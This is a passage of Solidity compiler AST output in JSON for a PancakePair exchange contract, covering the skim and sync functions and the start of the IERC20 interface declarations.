															"nodeType": "ElementaryTypeName",
															"src": "17878:7:1",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1634,
												"initialValue": {
													"argumentTypes": null,
													"id": 1633,
													"name": "token0",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 475,
													"src": "17896:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "17878:24:1"
											},
											{
												"assignments": [
													1636
												],
												"declarations": [
													{
														"constant": false,
														"id": 1636,
														"name": "_token1",
														"nodeType": "VariableDeclaration",
														"scope": 1671,
														"src": "17927:15:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 1635,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "17927:7:1",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1638,
												"initialValue": {
													"argumentTypes": null,
													"id": 1637,
													"name": "token1",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 477,
													"src": "17945:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "17927:24:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1640,
															"name": "_token0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1632,
															"src": "18003:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1641,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1626,
															"src": "18024:2:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1651,
																	"name": "reserve0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 481,
																	"src": "18085:8:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1647,
																					"name": "this",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2475,
																					"src": "18074:4:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_contract$_PancakePair_$1700",
																						"typeString": "contract PancakePair"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_contract$_PancakePair_$1700",
																						"typeString": "contract PancakePair"
																					}
																				],
																				"id": 1646,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "18066:7:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_address_$",
																					"typeString": "type(address)"
																				},
																				"typeName": "address"
																			},
																			"id": 1648,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "18066:13:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1643,
																					"name": "_token0",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1632,
																					"src": "18047:7:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					}
																				],
																				"id": 1642,
																				"name": "IERC20",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1784,
																				"src": "18040:6:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_contract$_IERC20_$1784_$",
																					"typeString": "type(contract IERC20)"
																				}
																			},
																			"id": 1644,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "18040:15:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_IERC20_$1784",
																				"typeString": "contract IERC20"
																			}
																		},
																		"id": 1645,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "balanceOf",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 1745,
																		"src": "18040:25:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																			"typeString": "function (address) view external returns (uint256)"
																		}
																	},
																	"id": 1649,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18040:40:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1650,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sub",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2357,
																"src": "18040:44:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1652,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "18040:54:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1639,
														"name": "_safeTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 577,
														"src": "17976:13:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 1653,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17976:128:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1654,
												"nodeType": "ExpressionStatement",
												"src": "17976:128:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1656,
															"name": "_token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1636,
															"src": "18141:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1657,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1626,
															"src": "18162:2:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1667,
																	"name": "reserve1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 483,
																	"src": "18223:8:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1663,
																					"name": "this",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2475,
																					"src": "18212:4:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_contract$_PancakePair_$1700",
																						"typeString": "contract PancakePair"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_contract$_PancakePair_$1700",
																						"typeString": "contract PancakePair"
																					}
																				],
																				"id": 1662,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "18204:7:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_address_$",
																					"typeString": "type(address)"
																				},
																				"typeName": "address"
																			},
																			"id": 1664,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "18204:13:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1659,
																					"name": "_token1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1636,
																					"src": "18185:7:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					}
																				],
																				"id": 1658,
																				"name": "IERC20",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1784,
																				"src": "18178:6:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_contract$_IERC20_$1784_$",
																					"typeString": "type(contract IERC20)"
																				}
																			},
																			"id": 1660,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "18178:15:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_IERC20_$1784",
																				"typeString": "contract IERC20"
																			}
																		},
																		"id": 1661,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "balanceOf",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 1745,
																		"src": "18178:25:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																			"typeString": "function (address) view external returns (uint256)"
																		}
																	},
																	"id": 1665,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18178:40:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1666,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sub",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2357,
																"src": "18178:44:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1668,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "18178:54:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1655,
														"name": "_safeTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 577,
														"src": "18114:13:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 1669,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "18114:128:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1670,
												"nodeType": "ExpressionStatement",
												"src": "18114:128:1"
											}
										]
									},
									"documentation": null,
									"id": 1672,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 1629,
											"modifierName": {
												"argumentTypes": null,
												"id": 1628,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 513,
												"src": "17863:4:1",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "17863:4:1"
										}
									],
									"name": "skim",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1627,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1626,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1672,
												"src": "17842:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1625,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "17842:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "17841:12:1"
									},
									"returnParameters": {
										"id": 1630,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "17868:0:1"
									},
									"scope": 1700,
									"src": "17828:421:1",
									"stateMutability": "nonpayable",
									"superFunction": 2222,
									"visibility": "external"
								},
								{
									"body": {
										"id": 1698,
										"nodeType": "Block",
										"src": "18325:184:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1683,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2475,
																			"src": "18389:4:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_PancakePair_$1700",
																				"typeString": "contract PancakePair"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_PancakePair_$1700",
																				"typeString": "contract PancakePair"
																			}
																		],
																		"id": 1682,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "18381:7:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": "address"
																	},
																	"id": 1684,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18381:13:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1679,
																			"name": "token0",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 475,
																			"src": "18363:6:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 1678,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1784,
																		"src": "18356:6:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$1784_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 1680,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18356:14:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$1784",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 1681,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 1745,
																"src": "18356:24:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 1685,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "18356:39:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1691,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2475,
																			"src": "18442:4:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_PancakePair_$1700",
																				"typeString": "contract PancakePair"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_PancakePair_$1700",
																				"typeString": "contract PancakePair"
																			}
																		],
																		"id": 1690,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "18434:7:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": "address"
																	},
																	"id": 1692,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18434:13:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1687,
																			"name": "token1",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 477,
																			"src": "18416:6:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 1686,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1784,
																		"src": "18409:6:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$1784_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 1688,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18409:14:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$1784",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 1689,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 1745,
																"src": "18409:24:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 1693,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "18409:39:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1694,
															"name": "reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 481,
															"src": "18462:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1695,
															"name": "reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 483,
															"src": "18484:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1677,
														"name": "_update",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 762,
														"src": "18335:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint256_$_t_uint256_$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint256,uint256,uint112,uint112)"
														}
													},
													"id": 1696,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "18335:167:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1697,
												"nodeType": "ExpressionStatement",
												"src": "18335:167:1"
											}
										]
									},
									"documentation": null,
									"id": 1699,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 1675,
											"modifierName": {
												"argumentTypes": null,
												"id": 1674,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 513,
												"src": "18320:4:1",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "18320:4:1"
										}
									],
									"name": "sync",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1673,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "18308:2:1"
									},
									"returnParameters": {
										"id": 1676,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "18325:0:1"
									},
									"scope": 1700,
									"src": "18295:214:1",
									"stateMutability": "nonpayable",
									"superFunction": 2225,
									"visibility": "external"
								}
							],
							"scope": 1701,
							"src": "318:18193:1"
						}
					],
					"src": "36:18476:1"
				},
				"id": 1
			},
			"src/exchange-protocol/contracts/interfaces/IERC20.sol": {
				"ast": {
					"absolutePath": "src/exchange-protocol/contracts/interfaces/IERC20.sol",
					"exportedSymbols": {
						"IERC20": [
							1784
						]
					},
					"id": 1785,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1702,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:2"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 1784,
							"linearizedBaseContracts": [
								1784
							],
							"name": "IERC20",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": null,
									"id": 1710,
									"name": "Approval",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1709,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1704,
												"indexed": true,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 1710,
												"src": "100:21:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1703,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "100:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1706,
												"indexed": true,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 1710,
												"src": "123:23:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1705,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "123:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1708,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1710,
												"src": "148:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1707,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "148:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "99:63:2"
									},
									"src": "85:78:2"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 1718,
									"name": "Transfer",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1717,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1712,
												"indexed": true,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 1718,
												"src": "183:20:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1711,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "183:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1714,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1718,
												"src": "205:18:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1713,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "205:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1716,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1718,
												"src": "225:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1715,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "225:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "182:57:2"
									},
									"src": "168:72:2"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1723,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "name",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1719,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "259:2:2"
									},
									"returnParameters": {
										"id": 1722,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1721,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1723,
												"src": "285:13:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1720,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "285:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "284:15:2"
									},
									"scope": 1784,
									"src": "246:54:2",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 1728,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "symbol",
									"nodeType": "FunctionDefinition",
